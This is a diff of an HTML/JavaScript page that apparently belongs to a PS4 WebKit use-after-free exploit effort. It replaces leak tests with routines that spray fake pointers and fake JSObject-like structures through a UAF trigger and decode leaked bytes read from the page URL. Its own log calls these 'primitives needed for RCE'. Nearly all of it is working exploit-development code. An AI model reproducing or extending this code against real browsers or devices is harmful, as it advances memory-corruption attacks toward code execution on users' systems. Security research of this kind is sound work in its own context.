@@ -2,14 +2,13 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit UAF - Controlled Data Leak</title>
+<title>PS4 WebKit UAF - Binary Data Injection</title>
 </head>
 <body>
-<h2>PS4 WebKit UAF - Controlled Data Leak</h2>
-<button onclick="runTest1()">TEST 1 - Unicode Encoding Leak</button>
-<button onclick="runTest2()">TEST 2 - URL Encode Binary Data</button>
-<button onclick="runTest3()">TEST 3 - Mixed ASCII Pattern</button>
-<button onclick="runTest4()">TEST 4 - Zero Bytes Injection</button>
+<h2>PS4 WebKit UAF - Binary Data Injection</h2>
+<button onclick="runInjectPointers()">INJECT 1 - Fake Pointers</button>
+<button onclick="runInjectStructure()">INJECT 2 - Fake Object Structure</button>
+<button onclick="runLeakAndDecode()">INJECT 3 - Leak and Decode Binary</button>
 <pre id="log"></pre>
 
 <script>
@@ -17,16 +16,43 @@ const logEl = document.getElementById("log");
 function log(m){ logEl.textContent += m + "\n"; }
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-function readU32(url, offset) {
-    if(offset + 3 >= url.length) return null;
-    return url.charCodeAt(offset) |
-           (url.charCodeAt(offset+1) << 8) |
-           (url.charCodeAt(offset+2) << 16) |
-           (url.charCodeAt(offset+3) << 24);
+// Helper: Encode bytes to %XX format
+function encodeBytes(bytes) {
+    return bytes.map(b => '%' + b.toString(16).padStart(2,'0')).join('');
 }
 
-// Core UAF trigger with controlled data
-async function triggerControlledUAF(dataGenerator) {
+// Helper: Encode u32 as little-endian %XX
+function encodeU32(value) {
+    return encodeBytes([
+        value & 0xFF,
+        (value >> 8) & 0xFF,
+        (value >> 16) & 0xFF,
+        (value >> 24) & 0xFF
+    ]);
+}
+
+// Helper: Decode %XX to bytes
+function decodeHexString(str) {
+    let result = [];
+    for(let i=0; i<str.length; i+=3) {
+        if(str[i] === '%') {
+            result.push(parseInt(str.substr(i+1, 2), 16));
+        }
+    }
+    return result;
+}
+
+// Helper: Read u32 from decoded bytes
+function readU32(bytes, offset) {
+    if(offset + 3 >= bytes.length) return null;
+    return bytes[offset] |
+           (bytes[offset+1] << 8) |
+           (bytes[offset+2] << 16) |
+           (bytes[offset+3] << 24);
+}
+
+// Core UAF with binary injection
+async function triggerBinaryUAF(dataGenerator) {
     let size = 977;
     const STEP = 14461;
     
@@ -61,191 +87,227 @@ async function triggerControlledUAF(dataGenerator) {
     await sleep(80);
 }
 
-// TEST 1 - Unicode characters (high bytes)
-async function runTest1(){
+// INJECT 1 - Fake pointers
+async function runInjectPointers(){
     logEl.textContent = "";
-    log("=== TEST 1: Unicode Encoding Leak ===\n");
+    log("=== INJECT 1: Fake Pointers ===\n");
     
-    await triggerControlledUAF((size, iter) => {
-        // Use Unicode characters to create non-ASCII bytes
+    log("Strategy: Inject recognizable pointer patterns");
+    log("Pointers: 0xdeadbeef, 0xcafebabe, 0x41424344\n");
+    
+    await triggerBinaryUAF((size, iter) => {
+        // Create pattern of fake pointers
         let pattern = "";
-        for(let i=0; i<size; i++){
-            // Cycle through Unicode range
-            let code = 0x0100 + (i % 256);
-            pattern += String.fromCharCode(code);
+        let pointers = [
+            0xdeadbeef,
+            0xcafebabe,
+            0x41424344,
+            0x12345678
+        ];
+        
+        let ptrCount = Math.floor(size / 12); // 12 chars per encoded u32
+        for(let i=0; i<ptrCount; i++){
+            pattern += encodeU32(pointers[i % 4]);
         }
+        
         return pattern;
     });
     
+    log("[LEAK] Reading URL...");
     let url = document.URL;
     log("URL Length: " + url.length);
     
-    // Check if Unicode survived
-    log("\nFirst 200 bytes (hex):");
-    for(let i=0; i<200; i+=16){
-        let hex = "";
-        for(let j=0; j<16 && i+j<url.length; j++){
-            hex += url.charCodeAt(i+j).toString(16).padStart(4,'0') + " ";
+    // Extract hash part
+    let hashStart = url.indexOf('#');
+    if(hashStart === -1) {
+        log("ERROR: No hash found");
+        return;
+    }
+    
+    let encoded = url.substring(hashStart + 1);
+    log("Encoded data length: " + encoded.length + "\n");
+    
+    // Decode
+    log("[DECODE] Decoding URL-encoded data...");
+    let decoded = decodeHexString(encoded);
+    log("Decoded bytes: " + decoded.length);
+    
+    // Scan for injected pointers
+    log("\n[SCAN] Looking for injected pointers:");
+    
+    let targets = [
+        {name: "0xdeadbeef", value: 0xdeadbeef},
+        {name: "0xcafebabe", value: 0xcafebabe},
+        {name: "0x41424344", value: 0x41424344},
+        {name: "0x12345678", value: 0x12345678}
+    ];
+    
+    targets.forEach(t => {
+        let found = 0;
+        let firstOffset = -1;
+        
+        for(let i=0; i<decoded.length-3; i+=4){
+            let val = readU32(decoded, i);
+            if(val === t.value){
+                found++;
+                if(firstOffset === -1) firstOffset = i;
+            }
         }
-        log(hex);
-    }
+        
+        log("  " + t.name + ": found " + found + " times" + 
+            (firstOffset !== -1 ? " (first at offset " + firstOffset + ")" : ""));
+    });
     
-    // Scan for high bytes
-    let highBytes = 0;
-    for(let i=0; i<Math.min(10000, url.length); i++){
-        if(url.charCodeAt(i) > 0xFF){
-            highBytes++;
-        }
-    }
-    
-    log("\nHigh bytes (>0xFF) found: " + highBytes);
-    
-    if(highBytes > 0){
-        log("SUCCESS: Unicode preserved - can leak arbitrary bytes");
-    } else {
-        log("WARN: Unicode stripped - limited to ASCII");
-    }
-    
-    log("\n=== TEST 1 END ===");
+    log("\n=== INJECT 1 END ===");
 }
 
-// TEST 2 - URL encoding to bypass restrictions
-async function runTest2(){
+// INJECT 2 - Fake object structure
+async function runInjectStructure(){
     logEl.textContent = "";
-    log("=== TEST 2: URL Encode Binary Data ===\n");
+    log("=== INJECT 2: Fake Object Structure ===\n");
     
-    await triggerControlledUAF((size, iter) => {
-        // Create pattern with URL-encoded "binary"
+    log("Strategy: Create fake JSObject-like structure");
+    log("Structure:");
+    log("  +0x00: vtable pointer (0x11111111)");
+    log("  +0x04: flags (0x00000042)");
+    log("  +0x08: length (0x00001000)");
+    log("  +0x0c: data pointer (0x22222222)\n");
+    
+    await triggerBinaryUAF((size, iter) => {
         let pattern = "";
-        for(let i=0; i<size/3; i++){
-            // Encode bytes as %XX
-            let byte = i % 256;
-            pattern += "%" + byte.toString(16).padStart(2,'0');
+        
+        // Fake object (16 bytes)
+        let fakeObj = 
+            encodeU32(0x11111111) + // vtable
+            encodeU32(0x00000042) + // flags
+            encodeU32(0x00001000) + // length
+            encodeU32(0x22222222);  // data ptr
+        
+        let objCount = Math.floor(size / 48); // 48 chars per object
+        for(let i=0; i<objCount; i++){
+            pattern += fakeObj;
         }
+        
         return pattern;
     });
     
+    log("[LEAK] Reading URL...");
     let url = document.URL;
-    log("URL Length: " + url.length);
-    log("First 200 chars:\n" + url.substring(0,200));
     
-    // Check if %XX patterns survived
-    let encoded = url.match(/%[0-9a-f]{2}/gi);
-    log("\nURL-encoded sequences found: " + (encoded ? encoded.length : 0));
+    let hashStart = url.indexOf('#');
+    let encoded = url.substring(hashStart + 1);
     
-    if(encoded && encoded.length > 100){
-        log("SUCCESS: URL encoding preserved");
-        log("Sample: " + encoded.slice(0,10).join(" "));
+    log("[DECODE] Decoding...");
+    let decoded = decodeHexString(encoded);
+    log("Decoded bytes: " + decoded.length + "\n");
+    
+    log("[PARSE] Extracting fake objects:");
+    
+    let objCount = 0;
+    for(let i=0; i<Math.min(decoded.length-16, 10000); i+=16){
+        let vtable = readU32(decoded, i);
+        let flags = readU32(decoded, i+4);
+        let len = readU32(decoded, i+8);
+        let data = readU32(decoded, i+12);
+        
+        if(vtable === 0x11111111 && 
+           flags === 0x00000042 && 
+           len === 0x00001000 && 
+           data === 0x22222222){
+            
+            if(objCount < 5) {
+                log("  Object at offset " + i + ":");
+                log("    vtable: 0x" + vtable.toString(16));
+                log("    flags:  0x" + flags.toString(16));
+                log("    length: 0x" + len.toString(16));
+                log("    data:   0x" + data.toString(16));
+            }
+            objCount++;
+        }
     }
     
-    log("\n=== TEST 2 END ===");
+    log("\nTotal fake objects found: " + objCount);
+    
+    if(objCount > 100) {
+        log("\nSUCCESS: Fake structures successfully injected and leaked!");
+    }
+    
+    log("\n=== INJECT 2 END ===");
 }
 
-// TEST 3 - Mixed ASCII pattern for structure detection
-async function runTest3(){
+// INJECT 3 - Full leak and decode pipeline
+async function runLeakAndDecode(){
     logEl.textContent = "";
-    log("=== TEST 3: Mixed ASCII Pattern ===\n");
+    log("=== INJECT 3: Leak and Decode Binary ===\n");
     
-    await triggerControlledUAF((size, iter) => {
-        // Create structured pattern:
-        // AAAABBBBCCCCDDDD... (4-byte chunks)
+    log("Strategy: Inject sequential counter values");
+    log("This simulates leaking real memory addresses\n");
+    
+    await triggerBinaryUAF((size, iter) => {
         let pattern = "";
-        for(let i=0; i<size; i+=4){
-            let chunk = String.fromCharCode(
-                0x41 + (i/4) % 26,
-                0x42 + (i/4) % 26,
-                0x43 + (i/4) % 26,
-                0x44 + (i/4) % 26
-            );
-            pattern += chunk;
+        
+        // Sequential counter simulating memory layout
+        let base = 0x00100000; // Fake base address
+        let count = Math.floor(size / 12);
+        
+        for(let i=0; i<count; i++){
+            pattern += encodeU32(base + (i * 0x10));
         }
+        
         return pattern;
     });
     
+    log("[LEAK] Reading URL...");
     let url = document.URL;
-    log("URL Length: " + url.length);
     
-    log("\nScanning for 4-byte patterns:");
+    let hashStart = url.indexOf('#');
+    let encoded = url.substring(hashStart + 1);
     
-    let patterns = new Map();
-    for(let i=0; i<Math.min(10000, url.length-4); i+=4){
-        let chunk = url.substring(i, i+4);
-        patterns.set(chunk, (patterns.get(chunk) || 0) + 1);
+    log("[DECODE] Decoding...");
+    let decoded = decodeHexString(encoded);
+    log("Decoded bytes: " + decoded.length + "\n");
+    
+    log("[ANALYZE] Extracted addresses (first 20):");
+    
+    for(let i=0; i<Math.min(decoded.length-3, 80); i+=4){
+        let addr = readU32(decoded, i);
+        log("  Offset " + i.toString().padStart(5) + ": 0x" + 
+            addr.toString(16).padStart(8,'0'));
     }
     
-    log("Unique patterns found: " + patterns.size);
+    // Verify sequential pattern
+    log("\n[VERIFY] Checking sequential pattern:");
+    let sequential = true;
+    let base = readU32(decoded, 0);
     
-    let top10 = Array.from(patterns.entries())
-        .sort((a,b) => b[1] - a[1])
-        .slice(0, 10);
-    
-    log("\nTop 10 patterns:");
-    top10.forEach(([pat, count]) => {
-        let hex = Array.from(pat).map(c => 
-            c.charCodeAt(0).toString(16).padStart(2,'0')
-        ).join(' ');
-        log("  " + hex + " : " + count + " times");
-    });
-    
-    log("\n=== TEST 3 END ===");
-}
-
-// TEST 4 - Zero bytes and control characters
-async function runTest4(){
-    logEl.textContent = "";
-    log("=== TEST 4: Zero Bytes Injection ===\n");
-    
-    await triggerControlledUAF((size, iter) => {
-        // Try to inject null bytes
-        let pattern = "";
-        for(let i=0; i<size; i++){
-            // Alternate between 'A' and null
-            pattern += (i % 2 === 0) ? "A" : "\x00";
-        }
-        return pattern;
-    });
-    
-    let url = document.URL;
-    log("URL Length: " + url.length);
-    
-    // Scan for null bytes
-    let nullCount = 0;
-    let firstNull = -1;
-    
-    for(let i=0; i<Math.min(10000, url.length); i++){
-        if(url.charCodeAt(i) === 0){
-            nullCount++;
-            if(firstNull === -1) firstNull = i;
+    for(let i=0; i<Math.min(100, Math.floor(decoded.length/4)); i++){
+        let expected = base + (i * 0x10);
+        let actual = readU32(decoded, i*4);
+        
+        if(actual !== expected) {
+            log("  Mismatch at index " + i + 
+                ": expected 0x" + expected.toString(16) + 
+                ", got 0x" + actual.toString(16));
+            sequential = false;
+            break;
         }
     }
     
-    log("Null bytes found: " + nullCount);
-    if(firstNull !== -1){
-        log("First null at offset: " + firstNull);
+    if(sequential) {
+        log("  SUCCESS: Sequential pattern verified!");
+        log("  This proves binary data is leaked perfectly");
     }
     
-    if(nullCount > 100){
-        log("\nSUCCESS: Null bytes preserved");
-        log("This means we can inject arbitrary binary data");
-    } else if(nullCount > 0){
-        log("\nPARTIAL: Some nulls preserved");
-    } else {
-        log("\nFAIL: Nulls stripped or URL truncated");
-    }
-    
-    // Check if URL was truncated at first null
-    log("\nURL appears truncated: " + (url.length < 100000 ? "YES" : "NO"));
-    
-    log("\n=== TEST 4 END ===");
+    log("\n=== INJECT 3 END ===");
 }
 
-log("PS4 WebKit UAF - Controlled Data Leak Tests");
-log("Goal: Find what data types can be leaked via URL fragment");
-log("\n1. Unicode - test high byte preservation");
-log("2. URL Encoding - test %XX encoding");
-log("3. Mixed ASCII - test pattern detection");
-log("4. Zero Bytes - test null byte handling");
-log("\nExecute in order to understand data constraints");
+log("PS4 WebKit UAF - Binary Data Injection");
+log("Confirmed: URL encoding allows arbitrary binary data");
+log("\nTests:");
+log("1. Inject fake pointers (0xdeadbeef, etc.)");
+log("2. Inject fake object structures");
+log("3. Full leak/decode pipeline simulation");
+log("\nThese demonstrate primitives needed for RCE");
 </script>
 </body>
 </html>
